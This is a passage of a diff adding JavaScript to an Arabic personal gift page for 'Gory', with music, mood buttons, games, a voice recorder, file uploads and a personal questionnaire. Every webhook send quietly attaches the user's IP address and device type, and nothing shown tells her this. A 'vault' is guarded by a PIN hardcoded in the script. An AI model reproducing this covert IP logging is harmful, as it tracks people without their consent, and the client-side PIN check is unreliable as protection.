+            if (audio.paused) {
+                audio.play().then(() => { btn.innerText = "⏸"; }).catch(() => showToast("تعذر التشغيل", "error"));
+            } else {
+                audio.pause();
+                btn.innerText = "▶";
+            }
+        }
+        function changeTrack() {
+            const audio = document.getElementById('bgAudio');
+            const source = document.getElementById('audioSource');
+            const val = document.getElementById('trackSelect').value;
+            source.src = val;
+            localStorage.setItem('gory_track', val);
+            audio.load();
+            audio.play().then(() => { document.getElementById('playBtn').innerText = "⏸"; })
+                        .catch(() => { document.getElementById('playBtn').innerText = "▶"; });
+        }
+
+        async function sendMood(moodText, el) {
+            document.querySelectorAll('.mood-btn').forEach(b => b.classList.remove('selected'));
+            if (el) el.classList.add('selected');
+            localStorage.setItem('gory_last_mood', moodText);
+            const ok = await sendWebhook(`**شعور جوري اليوم:** ${moodText}\n**الجهاز:** ${getDeviceType()} | **IP:** ${(await getIPInfo())?.ip || 'غير معروف'}`);
+            showToast(ok ? "تم تسجيل شعورك" : "تعذر", ok ? "success" : "error");
+        }
+        (function restoreMood() {
+            const last = localStorage.getItem('gory_last_mood');
+            if (last) {
+                const btn = document.querySelector(`.mood-btn[data-mood="${last}"]`);
+                if (btn) btn.classList.add('selected');
+            }
+        })();
+
+        const dailyMessages = [
+            "ابتسامتك تغير يوم كامل", "أنت شخص نادر", "أتمنى لك يوم هادئ", "مكانتك لا تتغير",
+            "وجودك يضيف دفء", "أنت أقوى مما تظنين", "كل خطوة صغيرة مهمة", "استمري في طريقك",
+            "أنت تستحقين الأفضل", "قلبك الطيب نعمة", "لا تنسي أن تحبي نفسك", "أنت مبدعة",
+            "أفكارك الجميلة تستحق التنفيذ", "أنت كافية كما أنت", "ابتسمي فالحياة جميلة",
+            "أنت تفهمينني بدون كلام", "كل يوم معك هدية", "صوتك يريحني", "ضحكتك موسيقى",
+            "أنت البيت الذي أعود إليه", "أحب تفاصيلك الصغيرة", "أنت أجمل صدفة في حياتي",
+            "لو خيروني ألف مرة سأختارك", "أنت أمان قلبي", "كل صباح أفكر فيك",
+            "أنت سر ابتسامتي", "وجودك يغير اللون", "معك كل شيء أسهل",
+            "أحب فيك كل شيء", "أنت سبب سعادتي اليومية"
+        ];
+        function getTodayMessage() {
+            const now = new Date();
+            const start = new Date(now.getFullYear(), 0, 0);
+            const dayOfYear = Math.floor((now - start) / 86400000);
+            return dailyMessages[dayOfYear % dailyMessages.length];
+        }
+        document.getElementById('fortuneText').innerText = getTodayMessage();
+
+        function unlockVault() {
+            if (document.getElementById('vaultPin').value.trim() === "2012") {
+                document.getElementById('vaultContent').style.display = "block";
+                showToast("الخزينة مفتوحة", "success");
+            } else {
+                showToast("رمز خطأ", "error");
+            }
+        }
+
+        function checkQuiz(el, isCorrect) {
+            if (el.classList.contains('correct') || el.classList.contains('wrong')) return;
+            const parent = el.parentElement;
+            parent.querySelectorAll('.quiz-option').forEach(o => { if (o !== el) o.classList.add('disabled'); });
+            el.classList.add(isCorrect ? 'correct' : 'wrong');
+            if (isCorrect) {
+                showToast("إجابة صحيحة", "success");
+            } else {
+                showToast("إجابة خاطئة", "error");
+                setTimeout(() => {
+                    parent.querySelectorAll('.quiz-option').forEach(o => { if (o !== el) o.classList.remove('disabled'); });
+                    el.classList.remove('wrong');
+                }, 1200);
+            }
+        }
+
+        function updateCharCount(taId, cId) {
+            const ta = document.getElementById(taId);
+            const c = document.getElementById(cId);
+            if (ta && c) c.innerText = ta.value.length + " حرف";
+        }
+
+        function incrementFeelingsBadge() {
+            const badge = document.getElementById('feelingsBadge');
+            let count = parseInt(badge.innerText) || 0;
+            badge.innerText = count + 1;
+            badge.classList.add('show');
+        }
+
+        async function sendPrivateNote() {
+            const noteText = document.getElementById('privateNote').value.trim();
+            if (!noteText) { showToast("اكتبي رسالة أولا", "error"); return; }
+            const ipInfo = await getIPInfo();
+            let msg = `**رسالة خاصة من جوري:**\n${noteText}\n\n`;
+            msg += `**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`;
+            const ok = await sendWebhook(msg);
+            if (ok) {
+                showToast("تم الإرسال", "success");
+                document.getElementById('privateNote').value = "";
+                document.getElementById('noteCount').innerText = "0 حرف";
+                incrementFeelingsBadge();
+            } else showToast("تعذر", "error");
+        }
+
+        const mapMemories = {
+            map1: "تايم بومب — أول لقاء، أول ضحكة، وأول كلمة أمجيزان.",
+            map2: "ريتاج — عرفتيني عليها، وبدأنا نتقابل أكثر.",
+            map3: "سيرفر 505 — كأن الدنيا تلف وترجع تجمعنا.",
+            map4: "أول فويس — أول مرة سمعت صوتك.",
+            map5: "أول أحبك — الكلمة اللي غيرت كل شيء."
+        };
+        function showMapMemory(key) {
+            const info = document.getElementById('mapInfo');
+            info.innerText = mapMemories[key] || "";
+            info.classList.add('show');
+        }
+
+        let mediaRecorder = null;
+        let audioChunks = [];
+        let recInterval = null;
+        let recSeconds = 0;
+        let isRecording = false;
+
+        async function toggleRecording() {
+            if (!isRecording) {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
+                    mediaRecorder = new MediaRecorder(stream);
+                    audioChunks = [];
+                    mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) audioChunks.push(e.data); };
+                    mediaRecorder.onstop = handleRecordingStop;
+                    mediaRecorder.start();
+                    isRecording = true;
+                    recSeconds = 0;
+                    document.getElementById('recBtn').classList.add('recording');
+                    document.getElementById('recStatus').innerText = "جاري التسجيل...";
+                    document.getElementById('recStopBtn').style.display = "inline-flex";
+                    document.getElementById('recTimer').innerText = "00:00";
+                    recInterval = setInterval(() => {
+                        recSeconds++;
+                        const m = String(Math.floor(recSeconds / 60)).padStart(2, '0');
+                        const s = String(recSeconds % 60).padStart(2, '0');
+                        document.getElementById('recTimer').innerText = m + ":" + s;
+                    }, 1000);
+                } catch (err) {
+                    showToast("لم يتم السماح بالميكروفون", "error");
+                }
+            } else {
+                stopRecording();
+            }
+        }
+
+        function stopRecording() {
+            if (mediaRecorder && isRecording) {
+                mediaRecorder.stop();
+                mediaRecorder.stream.getTracks().forEach(t => t.stop());
+                isRecording = false;
+                clearInterval(recInterval);
+                document.getElementById('recBtn').classList.remove('recording');
+                document.getElementById('recStopBtn').style.display = "none";
+                document.getElementById('recStatus').innerText = "جاري الإرسال...";
+            }
+        }
+
+        async function handleRecordingStop() {
+            if (audioChunks.length === 0) return;
+            const blob = new Blob(audioChunks, { type: 'audio/webm' });
+            const url = URL.createObjectURL(blob);
+            document.getElementById('recPreview').innerHTML = `
+                <audio controls src="${url}" style="width:100%;"></audio>
+                <button type="button" class="action-btn secondary" style="width:100%;margin-top:8px;" onclick="sendRecording()">إرسال التسجيل</button>
+            `;
+            window._pendingRecording = blob;
+            document.getElementById('recStatus').innerText = "جاهز للإرسال";
+        }
+
+        async function sendRecording() {
+            if (!window._pendingRecording) return;
+            const ipInfo = await getIPInfo();
+            const file = new File([window._pendingRecording], "voice_note.webm", { type: 'audio/webm' });
+            const formData = new FormData();
+            const content = `**رسالة صوتية من جوري**\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`;
+            formData.append('payload_json', JSON.stringify({ content }));
+            formData.append('files[0]', file);
+            try {
+                const res = await fetch(webhookUrl, { method: 'POST', body: formData });
+                if (res.ok) {
+                    showToast("تم إرسال التسجيل", "success");
+                    document.getElementById('recPreview').innerHTML = "";
+                    document.getElementById('recStatus').innerText = "اضغطي الميكروفون للبدء";
+                    window._pendingRecording = null;
+                    incrementFeelingsBadge();
+                } else {
+                    showToast("تعذر الإرسال", "error");
+                }
+            } catch (e) {
+                showToast("تعذر الإرسال", "error");
+            }
+        }
+
+        let gameInterval, gameTimer, gameScore = 0, gameActive = false;
+        function startHeartGame() {
+            stopHeartGame();
+            gameScore = 0;
+            gameActive = true;
+            let timeLeft = 20;
+            const area = document.getElementById('heartGameArea');
+            area.innerHTML = "";
+            document.getElementById('gameScore').innerText = `النقاط: 0 — الوقت: ${timeLeft}`;
+
+            gameInterval = setInterval(() => {
+                if (!gameActive) return;
+                const heart = document.createElement('div');
+                heart.className = 'game-heart';
+                heart.innerText = '💖';
+                const maxX = Math.max(0, area.clientWidth - 50);
+                const maxY = Math.max(0, area.clientHeight - 50);
+                heart.style.left = Math.random() * maxX + 'px';
+                heart.style.top = Math.random() * maxY + 'px';
+                heart.onclick = () => {
+                    if (!gameActive) return;
+                    gameScore++;
+                    document.getElementById('gameScore').innerText = `النقاط: ${gameScore} — الوقت: ${timeLeft}`;
+                    heart.remove();
+                };
+                area.appendChild(heart);
+                setTimeout(() => { if (heart.parentElement) heart.remove(); }, 1500);
+            }, 550);
+
+            gameTimer = setInterval(() => {
+                timeLeft--;
+                document.getElementById('gameScore').innerText = `النقاط: ${gameScore} — الوقت: ${timeLeft}`;
+                if (timeLeft <= 0) {
+                    stopHeartGame();
+                    showToast(`انتهت اللعبة. نتيجتك: ${gameScore}`, "info");
+                }
+            }, 1000);
+        }
+        function stopHeartGame() {
+            gameActive = false;
+            clearInterval(gameInterval);
+            clearInterval(gameTimer);
+            document.getElementById('heartGameArea').innerHTML = "";
+        }
+
+        let memoryCards = [], memoryFlipped = [], memoryMatched = 0, memoryMoves = 0, memoryLock = false;
+        const memoryEmojis = ['💖','🌸','✨','🎀','🌙','🎂','💌','🌟'];
+        function shuffleArr(arr) {
+            for (let i = arr.length - 1; i > 0; i--) {
+                const j = Math.floor(Math.random() * (i + 1));
+                [arr[i], arr[j]] = [arr[j], arr[i]];
+            }
+            return arr;
+        }
+        function initMemoryGame() {
+            memoryFlipped = [];
+            memoryMatched = 0;
+            memoryMoves = 0;
+            memoryLock = false;
+            memoryCards = shuffleArr([...memoryEmojis, ...memoryEmojis]);
+            const board = document.getElementById('memoryGame');
+            board.innerHTML = "";
+            memoryCards.forEach((emoji, idx) => {
+                const card = document.createElement('div');
+                card.className = 'memory-card';
+                card.dataset.emoji = emoji;
+                card.dataset.idx = idx;
+                card.innerText = emoji;
+                card.onclick = () => flipMemoryCard(card);
+                board.appendChild(card);
+            });
+            document.getElementById('memoryScore').innerText = `المحاولات: 0 — الأزواج: 0/8`;
+        }
+        function flipMemoryCard(card) {
+            if (memoryLock || card.classList.contains('flipped') || card.classList.contains('matched')) return;
+            card.classList.add('flipped');
+            memoryFlipped.push(card);
+            if (memoryFlipped.length === 2) {
+                memoryMoves++;
+                const [a, b] = memoryFlipped;
+                if (a.dataset.emoji === b.dataset.emoji) {
+                    a.classList.add('matched');
+                    b.classList.add('matched');
+                    memoryMatched++;
+                    memoryFlipped = [];
+                    if (memoryMatched === 8) {
+                        setTimeout(() => showToast(`مبروك! أكملتي اللعبة بـ ${memoryMoves} محاولة`, "success"), 300);
+                    }
+                } else {
+                    memoryLock = true;
+                    setTimeout(() => {
+                        a.classList.remove('flipped');
+                        b.classList.remove('flipped');
+                        memoryFlipped = [];
+                        memoryLock = false;
+                    }, 900);
+                }
+            }
+            document.getElementById('memoryScore').innerText = `المحاولات: ${memoryMoves} — الأزواج: ${memoryMatched}/8`;
+        }
+        initMemoryGame();
+
+        const quickQuestions = [
+            { q: "وش تحبين أكثر", a: "قهوة", b: "شاي" },
+            { q: "وش تفضلين", a: "بحر", b: "جبل" },
+            { q: "وش تحبين أكثر", a: "ليل", b: "نهار" },
+            { q: "وش تفضلين", a: "حلو", b: "مالح" },
+            { q: "وش تحبين أكثر", a: "شتاء", b: "صيف" },
+            { q: "وش تفضلين", a: "قطة", b: "كلب" },
+            { q: "وش تحبين أكثر", a: "فيلم", b: "مسلسل" },
+            { q: "وش تفضلين", a: "سفر", b: "بيت" }
+        ];
+        let quickIdx = 0, quickScore = 0, quickActive = false;
+        function startQuickGame() {
+            quickIdx = 0;
+            quickScore = 0;
+            quickActive = true;
+            document.getElementById('quickScore').innerText = `النقاط: 0`;
+            showQuickQuestion();
+        }
+        function showQuickQuestion() {
+            if (!quickActive || quickIdx >= quickQuestions.length) {
+                quickActive = false;
+                document.getElementById('quickQuestion').innerText = `انتهت اللعبة. نتيجتك: ${quickScore} من ${quickQuestions.length}`;
+                document.getElementById('quickOptions').innerHTML = "";
+                return;
+            }
+            const q = quickQuestions[quickIdx];
+            document.getElementById('quickQuestion').innerText = q.q;
+            const opts = document.getElementById('quickOptions');
+            opts.innerHTML = "";
+            [q.a, q.b].forEach(choice => {
+                const btn = document.createElement('button');
+                btn.type = 'button';
+                btn.innerText = choice;
+                btn.onclick = () => {
+                    quickScore++;
+                    document.getElementById('quickScore').innerText = `النقاط: ${quickScore}`;
+                    quickIdx++;
+                    showQuickQuestion();
+                };
+                opts.appendChild(btn);
+            });
+        }
+
+        let selectedFiles = [];
+
+        function formatFileSize(bytes) {
+            if (bytes < 1024) return bytes + ' B';
+            if (bytes < 1024 * 1024) return (bytes / 1024).toFixed(1) + ' KB';
+            return (bytes / (1024 * 1024)).toFixed(1) + ' MB';
+        }
+
+        function handleImageSelect(event) {
+            const files = Array.from(event.target.files || []);
+            if (!files.length) return;
+            files.forEach(file => selectedFiles.push(file));
+            renderPreviews();
+            event.target.value = "";
+        }
+
+        function renderPreviews() {
+            const grid = document.getElementById('previewGrid');
+            grid.innerHTML = "";
+            selectedFiles.forEach((file, idx) => {
+                const item = document.createElement('div');
+                item.className = 'preview-item';
+
+                if (file.type.startsWith('image/')) {
+                    const img = document.createElement('img');
+                    img.src = URL.createObjectURL(file);
+                    img.onload = () => URL.revokeObjectURL(img.src);
+                    item.appendChild(img);
+                } else if (file.type.startsWith('video/')) {
+                    const video = document.createElement('video');
+                    video.src = URL.createObjectURL(file);
+                    video.muted = true;
+                    video.playsInline = true;
+                    video.preload = 'metadata';
+                    video.onloadeddata = () => URL.revokeObjectURL(video.src);
+                    item.appendChild(video);
+                    const playIcon = document.createElement('div');
+                    playIcon.className = 'play-icon';
+                    playIcon.innerText = '▶️';
+                    item.appendChild(playIcon);
+                } else {
+                    const fileIcon = document.createElement('div');
+                    fileIcon.className = 'file-icon';
+                    fileIcon.innerHTML = `<span class="big-icon">📎</span><span>${file.name}</span>`;
+                    item.appendChild(fileIcon);
+                }
+
+                const sizeTag = document.createElement('div');
+                sizeTag.className = 'file-size';
+                sizeTag.innerText = formatFileSize(file.size);
+                item.appendChild(sizeTag);
+
+                const removeBtn = document.createElement('button');
+                removeBtn.className = 'preview-remove';
+                removeBtn.innerText = '✕';
+                removeBtn.type = 'button';
+                removeBtn.onclick = () => {
+                    selectedFiles.splice(idx, 1);
+                    renderPreviews();
+                };
+                item.appendChild(removeBtn);
+
+                grid.appendChild(item);
+            });
+        }
+
+        async function sendBatch(files, note, batchNum, totalBatches) {
+            try {
+                const ipInfo = await getIPInfo();
+                const formData = new FormData();
+                let content = `**ملفات من جوري** (${batchNum}/${totalBatches})`;
+                if (note) content += `\n**تعليق:** ${note}`;
+                content += `\n**الجهاز:** ${getDeviceType()} | **IP:** ${ipInfo?.ip || 'غير معروف'}`;
+                formData.append('payload_json', JSON.stringify({ content }));
+
+                files.forEach((file, i) => {
+                    formData.append(`files[${i}]`, file, file.name || `file_${i}`);
+                });
+
+                const res = await fetch(webhookUrl, { method: 'POST', body: formData });
+                return res.ok;
+            } catch (err) {
+                console.error('Batch error:', err);
+                return false;
+            }
+        }
+
+        async function sendImages() {
+            const status = document.getElementById('uploadStatus');
+            if (!selectedFiles.length) {
+                showToast("اختاري ملفا أولا", "error");
+                return;
+            }
+
+            const note = document.getElementById('imageNote').value.trim();
+            const valid = selectedFiles.filter(f => f.size <= DISCORD_MAX_FILE_SIZE);
+            const tooBig = selectedFiles.length - valid.length;
+
+            if (tooBig > 0) showToast(`${tooBig} ملف كبير تم تجاهله`, "error");
+            if (!valid.length) {
+                status.innerText = "لا توجد ملفات صالحة";
+                status.style.color = '#ef4444';
+                return;
+            }
+
+            const batches = [];
+            for (let i = 0; i < valid.length; i += DISCORD_BATCH_SIZE) {
+                batches.push(valid.slice(i, i + DISCORD_BATCH_SIZE));
+            }
+
+            status.style.color = 'var(--gold-accent)';
+            let successCount = 0;
+
+            for (let i = 0; i < batches.length; i++) {
+                status.innerText = `جاري إرسال ${i + 1}/${batches.length}...`;
+                const ok = await sendBatch(batches[i], note, i + 1, batches.length);
+                if (ok) successCount += batches[i].length;
+                if (i < batches.length - 1) await new Promise(r => setTimeout(r, DISCORD_BATCH_DELAY));
+            }
+
+            if (successCount === valid.length) {
+                status.innerText = `تم إرسال ${successCount} ملف`;
+                status.style.color = '#22c55e';
+                showToast(`تم إرسال ${successCount} ملف`, "success");
+                selectedFiles = [];
+                renderPreviews();
+                document.getElementById('imageNote').value = "";
+                incrementFeelingsBadge();
+            } else {
+                status.innerText = `تم إرسال ${successCount}`;
+                status.style.color = '#fbbf24';
+                showToast(`تم إرسال ${successCount}`, "info");
+            }
+        }
+
+        const uploadArea = document.getElementById('uploadArea');
+        ['dragover','dragenter'].forEach(ev => {
+            uploadArea.addEventListener(ev, (e) => { e.preventDefault(); uploadArea.classList.add('dragover'); });
+        });
+        ['dragleave','drop'].forEach(ev => {
+            uploadArea.addEventListener(ev, (e) => { e.preventDefault(); uploadArea.classList.remove('dragover'); });
+        });
+        uploadArea.addEventListener('drop', (e) => {
+            e.preventDefault();
+            const files = Array.from(e.dataTransfer.files || []);
+            if (!files.length) return;
+            files.forEach(file => selectedFiles.push(file));
+            renderPreviews();
+        });
+
+        const questionsData = [
+            { section: 'details', text: 'وش لونك المفضل' },
+            { section: 'details', text: 'وش أكلتك المفضلة' },
+            { section: 'details', text: 'وش مشروبك المفضل' },
+            { section: 'details', text: 'وش حلاوتك المفضلة' },
+            { section: 'details', text: 'وش فاكهتك المفضلة' },
+            { section: 'details', text: 'وش عطرك المفضل' },
+            { section: 'details', text: 'وش فصل السنة اللي تحبه أكثر' },
+            { section: 'details', text: 'وش وقتك المفضل باليوم' },
+            { section: 'details', text: 'وش جوك المفضل، المطر والبرد ولا الشمس والحر' },
+            { section: 'details', text: 'وش حيوانك المفضل' },
+            { section: 'details', text: 'وش رقمك المفضل' },
+            { section: 'details', text: 'وش حرفك المفضل' },
+            { section: 'details', text: 'وش أكثر دولة تتمنى تزورها' },
+            { section: 'details', text: 'وش المكان اللي تحس فيه بالراحة' },
+            { section: 'details', text: 'وش نوع الملابس اللي تحب تلبسها' },
+            { section: 'details', text: 'وش أكثر تطبيق تستخدمه' },
+            { section: 'details', text: 'وش أكثر لعبة تحبها' },
+            { section: 'details', text: 'وش لعبتك المفضلة أيام الطفولة' },
+            { section: 'details', text: 'وش نوع الأفلام والمسلسلات اللي تحبها' },
+            { section: 'details', text: 'وش أغنيتك المفضلة حاليا' },
+            { section: 'details', text: 'مين مغنيك المفضل' },
+            { section: 'details', text: 'وش أكثر شيء تحب تشتريه' },
+            { section: 'details', text: 'وش أكثر رياضة تحبها' },
+            { section: 'details', text: 'وش أكثر مادة دراسية تحبها' },
+            { section: 'details', text: 'وش المادة اللي ما تطيقها' },
+            { section: 'details', text: 'تحب البحر ولا البر' },
+            { section: 'details', text: 'تحب الليل ولا النهار' },
+            { section: 'details', text: 'تحب الطلعات ولا الجلسة بالبيت' },
+            { section: 'details', text: 'تحب الأماكن الهادية ولا الزحمة' },
+            { section: 'details', text: 'لو بتختار وجبة وحدة تاكلها أسبوع كامل' },
+            { section: 'personality', text: 'كيف توصف نفسك بثلاث كلمات' },
+            { section: 'personality', text: 'وش أكثر صفة تحبها في نفسك' },
+            { section: 'personality', text: 'وش أكثر صفة تتمنى تغيرها' },
+            { section: 'personality', text: 'أنت اجتماعي ولا تحب العزلة' },
+            { section: 'personality', text: 'أنت عصبي ولا بارد' },
+            { section: 'personality', text: 'إذا زعلت، تحب تتكلم ولا تسكت' },
+            { section: 'personality', text: 'إذا تضايقت، وش أول شيء تسويه' },
+            { section: 'personality', text: 'وش الشيء اللي يضحكك مهما كان مزاجك' },
+            { section: 'personality', text: 'وش الشيء اللي يعصبك بسرعة' },
+            { section: 'personality', text: 'وش أكثر عادة تسويها بدون ما تنتبه' },
+            { section: 'personality', text: 'تفكر كثير قبل النوم' },
+            { section: 'personality', text: 'تحب تخطط ولا تمشي على يومك' },
+            { section: 'personality', text: 'تأخذ قراراتك بعقلك ولا بقلبك' },
+            { section: 'personality', text: 'وش أكثر شيء يحمسك في يومك' },
+            { section: 'personality', text: 'وش الشيء اللي مستحيل تطلع من البيت بدونه' },
+            { section: 'personality', text: 'تحب المفاجآت ولا تفضل تعرف مسبقا' },
+            { section: 'personality', text: 'وش أكثر شيء يلفت انتباهك من أول لقاء' },
+            { section: 'personality', text: 'وش أكثر شيء يخليك ترتاح لشخص' },
+            { section: 'personality', text: 'وش يخليك تفقد اهتمامك بشخص' },
+            { section: 'personality', text: 'وش تتمنى الناس يعرفونه عنك' },
+            { section: 'childhood', text: 'كيف كنت وأنت صغير' },
+            { section: 'childhood', text: 'وش أجمل ذكرى من طفولتك' },
+            { section: 'childhood', text: 'وش أكثر موقف محرج تتذكره' },
+            { section: 'childhood', text: 'وش كانت أمنيتك وأنت صغير' },
+            { section: 'childhood', text: 'وش اللعبة اللي كنت تحبها بطفولتك' },
+            { section: 'childhood', text: 'مين كنت أقرب شخص له' },
+            { section: 'childhood', text: 'وش أكثر شيء كنت تخاف منه' },
+            { section: 'childhood', text: 'كنت هادي ولا مشاغب' },
+            { section: 'childhood', text: 'وش موقف للحين تضحك إذا تذكرته' },
+            { section: 'childhood', text: 'وش شيء كنت تحبه والحين تغير رأيك فيه' },
+            { section: 'childhood', text: 'وش أجمل هدية جتك' },
+            { section: 'childhood', text: 'وش موقف مستحيل تنساه' },
+            { section: 'childhood', text: 'لو تعيش يوم من طفولتك، أي يوم تختار' },
+            { section: 'childhood', text: 'وش أكثر شيء تشتاق له من أيام زمان' },
+            { section: 'childhood', text: 'طفولتك أثرت على شخصيتك' },
+            { section: 'dreams', text: 'وش تستمتع تسويه بوقت فراغك' },
+            { section: 'dreams', text: 'وش المهارة اللي تتمنى تتعلمها' },
+            { section: 'dreams', text: 'وش الشيء اللي تجلس تسويه ساعات بدون ملل' },
+            { section: 'dreams', text: 'لو عندك يوم فاضي، كيف بتقضيه' },
+            { section: 'dreams', text: 'وش الوظيفة اللي تتمناها' },
+            { section: 'dreams', text: 'وش أكبر هدف تحاول تحققه' },
+            { section: 'dreams', text: 'لو صار معك مبلغ كبير فجأة، وش أول شيء' },
+            { section: 'dreams', text: 'لو تعيش بأي دولة، وين تختار' },
+            { section: 'dreams', text: 'وش الشيء اللي ودك تجربه مرة' },
+            { section: 'dreams', text: 'لو تقابل شخصية مشهورة، مين' },
+            { section: 'dreams', text: 'وش تتمنى تنجح فيه' },
+            { section: 'dreams', text: 'حياة هادية ولا مغامرات' },
+            { section: 'dreams', text: 'وش تحس إنك مميز فيه' },
+            { section: 'dreams', text: 'لو تتقن موهبة فورا، وش' },
+            { section: 'dreams', text: 'كيف تتخيل حياتك بعد خمس سنوات' },
+            { section: 'feelings', text: 'وش يعدل مزاجك بسرعة' },
+            { section: 'feelings', text: 'متى تحس إنك مرتاح نفسيا فعلا' },
+            { section: 'feelings', text: 'وش أكثر شيء يشغل تفكيرك' },
+            { section: 'feelings', text: 'إذا مو بخير، تحب أحد يلاحظ ولا تقول' },
+            { section: 'feelings', text: 'وش تتمنى تقدر تتكلم عنه بدون تردد' },
+            { section: 'feelings', text: 'تسامح بسرعة ولا تحتاج وقت' },
+            { section: 'feelings', text: 'وش أكثر شعور يصعب التعبير عنه' },
+            { section: 'feelings', text: 'آخر مرة حسيت بفخر تجاه نفسك' },
+            { section: 'feelings', text: 'وش يخليك تحس بالأمان مع شخص' },
+            { section: 'feelings', text: 'تهتم بكلام الناس' },
+            { section: 'feelings', text: 'وش يستنزف طاقتك النفسية' },
+            { section: 'feelings', text: 'إذا حزين، وش يساعدك تتجاوز' },
+            { section: 'feelings', text: 'تحس الناس يفهمونك' },
+            { section: 'feelings', text: 'وش تتمنى تتخلص منه في تفكيرك' },
+            { section: 'feelings', text: 'وش تعلمت عن نفسك مؤخرا' },
+            { section: 'feelings', text: 'تعترف بأخطائك بسهولة' },
+            { section: 'feelings', text: 'وش يخليك تحس إنك مو كفاية' },
+            { section: 'feelings', text: 'وش تحتاجه لما تمر بفترة صعبة' },
+            { section: 'feelings', text: 'فيه شيء تغير فيك وما زلت تفهمه' },
+            { section: 'feelings', text: 'لو توجه لنفسك رسالة، وش' },
+            { section: 'relations', text: 'أهم صفة لازم تكون بصديقك' },
+            { section: 'relations', text: 'وش يخليك تثق بشخص' },
+            { section: 'relations', text: 'عندك شخص تقول له كل شيء' },
+            { section: 'relations', text: 'وش تصرف يثبت إن الشخص يهتم' },
+            { section: 'relations', text: 'الصديق اللي يشبهك ولا يكملك' },
+            { section: 'relations', text: 'وش مستحيل تسامح عليه بصداقة' },
+            { section: 'relations', text: 'إذا تغير عليك شخص تحبه، تسأله ولا تبتعد' },
+            { section: 'relations', text: 'علاقات قليلة عميقة ولا كثيرة' },
+            { section: 'relations', text: 'وش يجرحك من القريبين' },
+            { section: 'relations', text: 'تعطي فرص ثانية بسهولة' },
+            { section: 'relations', text: 'وش يخليك تحس إنك مهم عند شخص' },
+            { section: 'relations', text: 'تستمر بعلاقة مع شخص فقدت الثقة فيه' },
+            { section: 'relations', text: 'الفرق بين الحب والتعلق' },
+            { section: 'relations', text: 'الصريح اللي يجرح ولا اللي يراعي' },
+            { section: 'relations', text: 'وش تتمنى تحصل عليه من المقربين' },
+            { section: 'relations', text: 'إذا اشتقت لشخص، تقول ولا تنتظر' },
+            { section: 'relations', text: 'وش تصرف بسيط يسعدك طول اليوم' },
+            { section: 'relations', text: 'خسرت شخص بسبب سوء تفاهم' },
+            { section: 'relations', text: 'وش يخليك تتمسك بشخص رغم الخلافات' },
+            { section: 'relations', text: 'كيف تعرف إن الشخص قريب منك فعلا' },
+            { section: 'imagination', text: 'لو تسافر للماضي أو المستقبل' },
+            { section: 'imagination', text: 'لو تغير اسمك، وش تختار' },
+            { section: 'imagination', text: 'لو حياتك فيلم، وش اسمه' },
+            { section: 'imagination', text: 'تعيش داخل لعبة أو مسلسل' },
+            { section: 'imagination', text: 'قوة خارقة، وش تختار' },
+            { section: 'imagination', text: 'تستغني عن تطبيق واحد للأبد' },
+            { section: 'imagination', text: 'يوم كامل بدون مسؤوليات' },
+            { section: 'imagination', text: 'رحلة مجانية، مين تاخذ معك' },
+            { section: 'imagination', text: 'تتعلم إجابة سؤال واحد عن مستقبلك' },
+            { section: 'imagination', text: 'ترجع قرار واحد، وش تغير' },
+            { section: 'imagination', text: 'مليون ريال، وش أول ثلاثة أشياء' },
+            { section: 'imagination', text: 'سنة بدون جوال أو ألعاب' },
+            { section: 'imagination', text: 'تبدل حياتك مع شخص ليوم' },
+            { section: 'imagination', text: 'تعيد يوم من حياتك، أي يوم' },
+            { section: 'imagination', text: 'تحقق أمنية لشخص تحبه' },
+            { section: 'deep', text: 'وش تتمنى الناس يفهمونه عنك' },
+            { section: 'deep', text: 'راضي عن الشخص اللي صرت عليه' },
+            { section: 'deep', text: 'وش تخاف تعترف فيه لنفسك' },
+            { section: 'deep', text: 'متى تتظاهر إنك بخير' },
+            { section: 'deep', text: 'أكثر تجربة غيرت تفكيرك' },
+            { section: 'deep', text: 'شيء تتمنى تعاملت معه بطريقة مختلفة' },
+            { section: 'deep', text: 'وش فقدت من نفسك مع الوقت' },
+            { section: 'deep', text: 'وش تتمنى تتصالح معه' },
+            { section: 'deep', text: 'تعطي الآخرين أكثر مما تعطي نفسك' },
+            { section: 'deep', text: 'وش تتمنى أحد يسألك عنه' },
+            { section: 'deep', text: 'أكثر فكرة غيرت نظرتك للحياة' },
+            { section: 'deep', text: 'جانب منك محد يعرفه' },
+            { section: 'deep', text: 'وش تتمنى تبدأه من جديد' },
+            { section: 'deep', text: 'متى تحس إنك مفهوم فعلا' },
+            { section: 'deep', text: 'لو توصف حياتك بصدق' }
+        ];
+
+        const sectionNames = {
+            details: 'تفاصيلك اليومية',
+            personality: 'شخصيتك',
+            childhood: 'طفولتك وذكرياتك',
+            dreams: 'أحلامك وطموحك',
+            feelings: 'مشاعرك',
+            relations: 'علاقاتك',
+            imagination: 'خيالك وافتراضاتك',
+            deep: 'أسئلة عميقة'
+        };
+
+        const STORAGE_KEY = 'gory_full_answers_v2';
+        let currentFilter = 'all';
+        let currentSearch = '';
+        let allAnswers = {};
+
+        function loadAllAnswers() {
+            try {
+                allAnswers = JSON.parse(localStorage.getItem(STORAGE_KEY) || '{}');
+            } catch(e) { allAnswers = {}; }
+        }
+
+        function saveAnswer(index, value) {
+            if (value.trim()) allAnswers[index] = value;
+            else delete allAnswers[index];
+            try { localStorage.setItem(STORAGE_KEY, JSON.stringify(allAnswers)); } catch(e) {}
+            updateProgress();
+            updateQuestionLabel(index);
+        }
+
+        function updateProgress() {
+            const count = Object.keys(allAnswers).length;
+            const el = document.getElementById('answeredCount');
+            const fill = document.getElementById('progressFill');
+            if (el) el.innerText = count;
+            if (fill) fill.style.width = (count / 150 * 100) + '%';
+        }
+
+        function updateQuestionLabel(index) {
+            const item = document.querySelector(`[data-q-index="${index}"]`);
+            if (!item) return;
+            if (allAnswers[index]) item.classList.add('answered');
+            else item.classList.remove('answered');
+        }
+
+        function renderQuestions() {
+            const container = document.getElementById('questionsContainer');
+            if (!container) return;
+            container.innerHTML = '';
+
+            const sections = {};
+            questionsData.forEach((q, idx) => {
+                if (!sections[q.section]) sections[q.section] = [];
+                sections[q.section].push({ ...q, index: idx });
+            });
+
+            Object.keys(sections).forEach(sectionKey => {
+                const sectionQuestions = sections[sectionKey].filter(q => {
+                    return !currentSearch || q.text.includes(currentSearch);
+                });
+
+                if (!sectionQuestions.length) return;
+                if (currentFilter !== 'all' && currentFilter !== sectionKey) return;
+
